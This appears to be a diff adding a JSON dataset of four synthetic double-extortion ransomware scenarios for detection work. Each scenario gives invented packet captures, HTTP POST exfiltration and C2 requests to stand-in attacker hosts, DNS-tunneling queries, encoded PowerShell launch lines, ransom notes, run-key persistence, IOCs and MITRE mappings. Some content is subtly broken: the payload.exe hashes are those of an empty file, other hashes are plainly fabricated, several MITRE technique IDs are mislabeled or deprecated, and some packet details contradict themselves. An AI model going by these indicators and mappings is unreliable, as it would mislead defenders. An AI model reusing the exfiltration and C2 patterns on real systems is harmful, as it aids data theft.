@@ -1,0 +1,418 @@
+{
+  "samples": [
+    {
+      "scenario": "Double extortion ransomware attack leveraging SMB exfiltration followed by deployment of ransomware payload encrypting user documents and dropping ransom instructions.",
+      "technical_data": {
+        "network_traffic": {
+          "pcap_snippet": [
+            "Frame 8765: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits) on interface 1",
+            "Ethernet II, Src: 00:0c:29:3a:7d:b2 (00:0c:29:3a:7d:b2), Dst: 00:50:56:c0:00:01 (00:50:56:c0:00:01)",
+            "Internet Protocol Version 4, Src: 10.0.0.45, Dst: 172.217.11.174",
+            "Transmission Control Protocol, Src Port: 445, Dst Port: 445, Seq: 1001, Ack: 2001",
+            "SMB2 Session Setup Request",
+            "SMB2 Write Request: Write length: 8192 bytes",
+            "SMB2 Write Request: Write length: 16384 bytes"
+          ],
+          "http_requests": [
+            "POST /api/data/upload HTTP/1.1",
+            "Host: secure-transfer.attacker-site.net",
+            "User-Agent: curl/7.68.0",
+            "Content-Type: application/octet-stream",
+            "Content-Length: 2097152",
+            "Connection: close",
+            "",
+            "<binary data stream representing compressed and encrypted exfiltrated HR data>"
+          ],
+          "dns_queries": [
+            "Timestamp: 2024-05-15T08:45:22.456Z, Query: secure-transfer.attacker-site.net A IN",
+            "Timestamp: 2024-05-15T08:45:22.459Z, Query: secure-transfer.attacker-site.net AAAA IN"
+          ]
+        },
+        "logs": {
+          "file_server": [
+            "2024-05-15 08:44:50, INFO, User 'svc_sync' accessed file 'D:\\Projects\\ClientData\\Contracts_2024.pdf', size=2.8MB",
+            "2024-05-15 08:44:55, INFO, User 'svc_sync' accessed file 'D:\\HR\\Payroll_Confidential.xlsx', size=5.1MB"
+          ],
+          "endpoint_detection": [
+            "2024-05-15T08:50:10Z, ALERT, ProcessCreate: powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand JABzAGMAcgBpAHAAdAA9ACIAdABoAGkAcwBpAHMAIgA7ACQAZgBpAGwAZQAgPSBAAGcAZQB0AC0AYQB0AHQAcgBpAGIAdQB0AGUAIABbACcARABBAFQAYQAnAF0AOgA6AFsARwBlAHQAXQAoACQAcwBjAHIAaQBwAHQALgBuAGEAbQBlACA9ACAAJwBDAG8AbgBmAGkAZABlAG4AdABpAGEAbAAgAGQAYQB0AGEAXwAyADAAMgA0AC4AcABkAGYnACkAOwAkAGYAaQBsAGUALgBzAHQAYQByAHQAKAApAA==",
+            "2024-05-15T08:50:12Z, ALERT, FileCreate: C:\\Users\\Public\\Documents\\HOW_TO_DECRYPT.txt"
+          ],
+          "ransom_note_file": {
+            "path": "C:\\Users\\Public\\Documents\\HOW_TO_DECRYPT.txt",
+            "content": "Your files have been encrypted using ChaCha20.\r\nTo retrieve your decryption key, contact us at support@darknetmail.com with ID: B7C9E4D2.\r\nFailure to pay within 48 hours will result in public release of your data.\r\n"
+          }
+        },
+        "file_hashes": [
+          {
+            "file": "C:\\Windows\\Temp\\payload.exe",
+            "MD5": "d41d8cd98f00b204e9800998ecf8427e",
+            "SHA1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+            "SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          }
+        ],
+        "registry_changes": [
+          "Path: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Name: SysSync",
+          "Type: REG_SZ",
+          "Data: C:\\Windows\\Temp\\payload.exe"
+        ],
+        "memory_dump_analysis": [
+          "Process 'payload.exe' modules loaded:",
+          " - kernelbase.dll at 0x7700000",
+          " - advapi32.dll at 0x75a8000",
+          "API calls observed:",
+          " - EncryptFile() API called on multiple user documents",
+          " - CreateFileMapping() and MapViewOfFile() for memory manipulation",
+          " - WinHttpOpen() used to POST exfiltrated data to secure-transfer.attacker-site.net"
+        ],
+        "command_and_control_traffic": [
+          "POST /api/data/upload HTTP/1.1",
+          "Host: secure-transfer.attacker-site.net",
+          "User-Agent: curl/7.68.0",
+          "Content-Type: application/octet-stream",
+          "Content-Length: 2097152",
+          "",
+          "<binary encrypted data>"
+        ]
+      },
+      "indicators": {
+        "ioc_domains": [
+          "secure-transfer.attacker-site.net",
+          "support@darknetmail.com"
+        ],
+        "ioc_file_hashes": [
+          "d41d8cd98f00b204e9800998ecf8427e"
+        ],
+        "ioc_registry_keys": [
+          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysSync"
+        ],
+        "ioc_processes": [
+          "payload.exe",
+          "powershell.exe"
+        ]
+      },
+      "detection_method": "Identify unusual SMB write activity correlating with large file reads of sensitive data. Detect encoded PowerShell commands creating suspicious files and autorun registry entries. Monitor network traffic for POST requests uploading large encrypted payloads to uncommon external hosts. Combine endpoint telemetry with registry and process anomaly detection for rapid identification.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1490 - Inhibit System Recovery",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1059.001 - PowerShell",
+        "T1071.001 - Web Protocols",
+        "T1560.002 - Archive Collected Data: Archive via SMB/Windows Admin Shares",
+        "T1060 - Registry Run Keys / Startup Folder",
+        "T1562.001 - Impair Defenses: Disable or Modify Tools"
+      ]
+    },
+    {
+      "scenario": "Double extortion ransomware campaign utilizing custom encryption malware; exfiltration via DNS tunneling before encrypting enterprise file shares and dropping a ransom note demanding payment via Tor.",
+      "technical_data": {
+        "network_traffic": {
+          "pcap_snippet": [
+            "Frame 4321: 512 bytes on wire (4096 bits), 512 bytes captured (4096 bits) on interface 2",
+            "Ethernet II, Src: 00:0c:29:5e:3c:9d (00:0c:29:5e:3c:9d), Dst: 00:50:56:c0:00:02 (00:50:56:c0:00:02)",
+            "Internet Protocol Version 4, Src: 192.168.10.15, Dst: 198.51.100.7",
+            "User Datagram Protocol, Src Port: 5353, Dst Port: 53",
+            "Domain Name System (query)",
+            "Standard query A exfil-01.attacker-tunnel.net",
+            "TXT Record Response: base64-encoded chunk of sensitive data"
+          ],
+          "http_requests": [
+            "GET /checkin HTTP/1.1",
+            "Host: c2node.attacker-tunnel.net",
+            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "Accept: application/json",
+            "Connection: keep-alive",
+            "",
+            ""
+          ],
+          "dns_queries": [
+            "Timestamp: 2024-05-20T21:15:50.789Z, Query: exfil-01.attacker-tunnel.net TXT IN",
+            "Timestamp: 2024-05-20T21:15:51.002Z, Query: exfil-02.attacker-tunnel.net TXT IN"
+          ]
+        },
+        "logs": {
+          "file_server": [
+            "2024-05-20 21:16:10, INFO, User 'svc_rsync' accessed file '\\\\fileserver\\Shared\\Confidential\\Strategy2024.docx', size=3.6MB",
+            "2024-05-20 21:16:15, INFO, User 'svc_rsync' accessed file '\\\\fileserver\\Shared\\Finance\\Budget2024.xlsx', size=2.9MB"
+          ],
+          "endpoint_detection": [
+            "2024-05-20T21:20:40Z, ALERT, ProcessCreate: malware_loader.exe -decrypt -silent",
+            "2024-05-20T21:20:42Z, ALERT, FileCreate: C:\\Users\\Public\\Documents\\DECRYPT_INSTRUCTIONS.txt"
+          ],
+          "ransom_note_file": {
+            "path": "C:\\Users\\Public\\Documents\\DECRYPT_INSTRUCTIONS.txt",
+            "content": "Your files are encrypted with RSA-4096 and ChaCha20.\r\nTo restore access, send 50 BTC to the provided wallet and access our Tor payment site at http://torpaymentportal.onion.\r\nYour unique ID: 4D2F1C9E.\r\nIf payment is not received within 96 hours, stolen data will be released publicly.\r\n"
+          }
+        },
+        "file_hashes": [
+          {
+            "file": "C:\\Windows\\Temp\\malware_loader.exe",
+            "MD5": "a3f5c6d7e8f9b0123456789abcdeffed",
+            "SHA1": "c0ffee254b3a1b2c3d4e5f67890abcdef1234567",
+            "SHA256": "b1946ac92492d2347c6235b4d2611184a91a3a5c9f4f923b5c5d8e7a6f9c1b2c"
+          }
+        ],
+        "registry_changes": [
+          "Path: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Name: LoaderStart",
+          "Type: REG_SZ",
+          "Data: C:\\Windows\\Temp\\malware_loader.exe"
+        ],
+        "memory_dump_analysis": [
+          "Process 'malware_loader.exe' loaded modules:",
+          " - wsock32.dll at 0x7600000",
+          " - dnsapi.dll at 0x75a9000",
+          "API calls observed:",
+          " - DnsQuery() repeatedly called with TXT record type to exfiltrate data",
+          " - CryptEncrypt() invoked to encrypt files",
+          " - CreateProcess() used to launch encryption threads"
+        ],
+        "command_and_control_traffic": [
+          "GET /checkin HTTP/1.1",
+          "Host: c2node.attacker-tunnel.net",
+          "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+          "Accept: application/json",
+          "",
+          "HTTP/1.1 200 OK",
+          "Content-Type: application/json",
+          "",
+          "{\"cmd\":\"encrypt\",\"targets\":\"\\\\\\\fileserver\\Shared\\*.*\"}"
+        ]
+      },
+      "indicators": {
+        "ioc_domains": [
+          "exfil-01.attacker-tunnel.net",
+          "exfil-02.attacker-tunnel.net",
+          "c2node.attacker-tunnel.net"
+        ],
+        "ioc_file_hashes": [
+          "a3f5c6d7e8f9b0123456789abcdeffed"
+        ],
+        "ioc_registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\LoaderStart"
+        ],
+        "ioc_processes": [
+          "malware_loader.exe"
+        ]
+      },
+      "detection_method": "Monitor DNS traffic for abnormal TXT record queries indicating data tunneling. Correlate with endpoint logs showing suspicious process creation and file access patterns. Detect creation of ransom note files and registry autorun persistence. Analyze memory dumps for DNS exfiltration and encryption API usage to confirm double extortion activity.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1490 - Inhibit System Recovery",
+        "T1071.004 - Exfiltration Over Alternative Protocol: DNS",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1059 - Command and Scripting Interpreter",
+        "T1060 - Registry Run Keys / Startup Folder",
+        "T1562.001 - Impair Defenses: Disable or Modify Tools",
+        "T1560.001 - Archive Collected Data"
+      ]
+    },
+    {
+      "scenario": "Double extortion ransomware attack leveraging stolen credentials for SMB data exfiltration followed by deployment of ransomware encrypting user files and dropping ransom note demanding payment in cryptocurrency.",
+      "technical_data": {
+        "network_traffic": {
+          "pcap_snippet": [
+            "Frame 2487: 1518 bytes on wire (12144 bits), 1518 bytes captured (12144 bits) on interface 1",
+            "Ethernet II, Src: 00:15:5d:01:23:45, Dst: 00:25:96:ff:ee:dd",
+            "Internet Protocol Version 4, Src: 10.0.5.22, Dst: 198.51.100.42",
+            "Server Message Block (SMB) Protocol, Command: Write AndX",
+            "SMB Data: <binary blob>",
+            "Transmission Control Protocol, Src Port: 445, Dst Port: 54021, Seq: 1024, Ack: 2048"
+          ],
+          "http_requests": [
+            "POST /api/v1/upload HTTP/1.1",
+            "Host: data-collector.darknet-c2.net",
+            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "Content-Type: application/octet-stream",
+            "Content-Length: 2097152",
+            "Connection: keep-alive",
+            "",
+            "<binary data blob representing exfiltrated compressed sensitive files>"
+          ],
+          "dns_queries": [
+            "Timestamp: 2024-05-20T08:47:12.456Z, Query: data-collector.darknet-c2.net A IN",
+            "Timestamp: 2024-05-20T08:47:12.459Z, Query: data-collector.darknet-c2.net AAAA IN"
+          ]
+        },
+        "logs": {
+          "file_server": [
+            "2024-05-20 08:46:55, INFO, User 'svc_admin' accessed file '\\\\CorpFiles\\Legal\\Contracts_2024.pdf', size=3.8MB",
+            "2024-05-20 08:47:00, INFO, User 'svc_admin' accessed file '\\\\CorpFiles\\Finance\\Budget2024.xlsx', size=2.1MB"
+          ],
+          "endpoint_detection": [
+            "2024-05-20T08:50:10Z, ALERT, ProcessCreate: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAHgAIAByAGUAdABlAG4AYwBlACAAJABmAGkAbABlAC0AdABvACAtAGYAbwBvAC0AVwBhAHIAcgBhAG4AdAAuAGUAeABlAA==",
+            "2024-05-20T08:50:12Z, ALERT, FileWrite: C:\\Users\\Public\\Documents\\HOW_TO_DECRYPT.txt"
+          ],
+          "ransom_note_file": {
+            "path": "C:\\Users\\Public\\Documents\\HOW_TO_DECRYPT.txt",
+            "content": "Your files have been encrypted using RSA-2048 and AES-256.\r\nTo recover your data, send 5 BTC to the provided wallet and contact us at decrypt@onionmail.org.\r\nFailure to pay within 48 hours will result in your data being published on the dark web.\r\n"
+          }
+        },
+        "file_hashes": [
+          {
+            "file": "C:\\Windows\\Temp\\encryptor.exe",
+            "MD5": "a1d0c6e83f027327d8461063f4ac58a6",
+            "SHA1": "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8",
+            "SHA256": "d2d2d2c5e7d5a3c2b9f2a4c9a5d6e4b7c8f0e1d2f3a4b5c6d7e8f9a0b1c2d3e4"
+          }
+        ],
+        "registry_changes": [
+          "Path: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Name: SysGuard",
+          "Type: REG_SZ",
+          "Data: C:\\Windows\\Temp\\encryptor.exe"
+        ],
+        "memory_dump_analysis": [
+          "Process 'encryptor.exe' loaded modules:",
+          " - ntdll.dll at 0x7ffde000",
+          " - kernelbase.dll at 0x7600000",
+          "API calls observed:",
+          " - CryptAcquireContext() and CryptEncrypt() used on user documents",
+          " - NetSessionEnum() and NetFileEnum() used to enumerate network shares",
+          " - HttpOpenRequest() and HttpSendRequest() to data-collector.darknet-c2.net"
+        ],
+        "command_and_control_traffic": [
+          "POST /api/v1/command HTTP/1.1",
+          "Host: data-collector.darknet-c2.net",
+          "User-Agent: Mozilla/5.0",
+          "Content-Type: application/json",
+          "Content-Length: 95",
+          "",
+          "{\"task\":\"encrypt\",\"target\":\"C:\\\\Users\\\\*\\\\Documents\\\\*.docx\"}"
+        ]
+      },
+      "indicators": {
+        "ioc_domains": [
+          "data-collector.darknet-c2.net",
+          "decrypt@onionmail.org"
+        ],
+        "ioc_file_hashes": [
+          "a1d0c6e83f027327d8461063f4ac58a6",
+          "d2d2d2c5e7d5a3c2b9f2a4c9a5d6e4b7c8f0e1d2f3a4b5c6d7e8f9a0b1c2d3e4"
+        ],
+        "ioc_registry_keys": [
+          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysGuard"
+        ],
+        "ioc_processes": [
+          "encryptor.exe",
+          "powershell.exe"
+        ]
+      },
+      "detection_method": "Combine network analysis to detect SMB outbound traffic to uncommon IP addresses with anomaly detection on encoded PowerShell commands launching suspicious encryption executables. Monitor for unusual registry autoruns and presence of ransom notes in public folders. Use endpoint behavioral analytics to track file encryption patterns and network exfiltration via HTTP POST to suspicious domains.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1490 - Inhibit System Recovery",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Web Protocols",
+        "T1027 - Obfuscated Files or Information",
+        "T1059.001 - PowerShell",
+        "T1112 - Modify Registry",
+        "T1560.001 - Archive Collected Data"
+      ]
+    },
+    {
+      "scenario": "Sophisticated double extortion ransomware campaign leveraging stolen VPN credentials to exfiltrate sensitive engineering documents via SFTP, followed by encryption of critical system files and ransom note deployment requesting payment via anonymous cryptocurrency.",
+      "technical_data": {
+        "network_traffic": {
+          "pcap_snippet": [
+            "Frame 3678: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits) on interface 2",
+            "Ethernet II, Src: 00:0a:95:9d:68:16, Dst: 00:0c:29:5e:1a:22",
+            "Internet Protocol Version 4, Src: 172.16.10.15, Dst: 203.0.113.77",
+            "Transmission Control Protocol, Src Port: 51345, Dst Port: 22, Seq: 3456, Ack: 7890",
+            "SSH Protocol Data: SFTP file upload",
+            "Encrypted Application Data, length: 2048"
+          ],
+          "http_requests": [
+            "POST /upload HTTP/1.1",
+            "Host: vpn-exfiltration.darkweb.net",
+            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "Content-Type: application/octet-stream",
+            "Content-Length: 3145728",
+            "Connection: keep-alive",
+            "",
+            "<binary data blob representing compressed exfiltrated engineering CAD files>"
+          ],
+          "dns_queries": [
+            "Timestamp: 2024-05-25T22:15:47.789Z, Query: vpn-exfiltration.darkweb.net A IN",
+            "Timestamp: 2024-05-25T22:15:47.792Z, Query: vpn-exfiltration.darkweb.net AAAA IN"
+          ]
+        },
+        "logs": {
+          "file_server": [
+            "2024-05-25 22:14:59, INFO, User 'svc_engineer' read file 'D:\\Projects\\Alpha\\design_v2.dwg', size=7.3MB",
+            "2024-05-25 22:15:02, INFO, User 'svc_engineer' read file 'D:\\Projects\\Alpha\\specifications.pdf', size=2.8MB"
+          ],
+          "endpoint_detection": [
+            "2024-05-25T22:20:10Z, ALERT, ProcessCreate: powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand JABwAHIAbwBjAGUAcwBzAGUAIABjcmVhdGUAIABjcnlwAHQAgA==",
+            "2024-05-25T22:20:13Z, ALERT, FileCreate: C:\\Users\\Public\\Documents\\READ_ME_FOR_DECRYPT.txt"
+          ],
+          "ransom_note_file": {
+            "path": "C:\\Users\\Public\\Documents\\READ_ME_FOR_DECRYPT.txt",
+            "content": "Your critical system files have been encrypted.\r\nTo retrieve your data, send 3 BTC to the wallet address: 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH.\r\nContact decrypt@securemail.onion for support.\r\nIf payment is not received within 72 hours, all stolen data will be published.\r\n"
+          }
+        },
+        "file_hashes": [
+          {
+            "file": "C:\\Windows\\Temp\\payload_encryptor.exe",
+            "MD5": "b1946ac92492d2347c6235b4d2611184",
+            "SHA1": "3b5d5c3712955042212316173ccf37be800a9a7c",
+            "SHA256": "c1d2e3f4a5b6c7d8e9f00112233445566778899aabbccddeeff0011223344556"
+          }
+        ],
+        "registry_changes": [
+          "Path: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "Name: UpdateAgent",
+          "Type: REG_SZ",
+          "Data: C:\\Windows\\Temp\\payload_encryptor.exe"
+        ],
+        "memory_dump_analysis": [
+          "Process 'payload_encryptor.exe' loaded modules:",
+          " - ntdll.dll at 0x7ffe0000",
+          " - kernel32.dll at 0x7700000",
+          "API calls observed:",
+          " - SftpInit() and SftpWrite() for exfiltration via SSH",
+          " - CryptEncrypt() used extensively on user documents",
+          " - CreateRemoteThread() used to inject code into svchost.exe",
+          " - WinHttpSendRequest() to vpn-exfiltration.darkweb.net"
+        ],
+        "command_and_control_traffic": [
+          "POST /command HTTP/1.1",
+          "Host: vpn-exfiltration.darkweb.net",
+          "User-Agent: Mozilla/5.0",
+          "Content-Type: application/json",
+          "Content-Length: 85",
+          "",
+          "{\"action\":\"encrypt\",\"files\":\"D:\\\\Projects\\\\Alpha\\\\*.dwg\"}"
+        ]
+      },
+      "indicators": {
+        "ioc_domains": [
+          "vpn-exfiltration.darkweb.net",
+          "decrypt@securemail.onion"
+        ],
+        "ioc_file_hashes": [
+          "b1946ac92492d2347c6235b4d2611184",
+          "c1d2e3f4a5b6c7d8e9f00112233445566778899aabbccddeeff0011223344556"
+        ],
+        "ioc_registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateAgent"
+        ],
+        "ioc_processes": [
+          "payload_encryptor.exe",
+          "powershell.exe"
+        ]
+      },
+      "detection_method": "Correlate VPN login events with unusual SFTP connections to suspicious external IPs. Monitor endpoint for PowerShell encoded commands spawning encryption payloads. Detect creation of ransom note files in public directories. Analyze registry autorun keys for unauthorized persistence mechanisms. Utilize memory forensics to identify process injection and encryption API usage patterns.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1490 - Inhibit System Recovery",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1021.004 - Remote Services: SSH",
+        "T1059.001 - PowerShell",
+        "T1112 - Modify Registry",
+        "T1055.001 - Process Injection",
+        "T1560.001 - Archive Collected Data"
+      ]
+    }
+  ]
+}
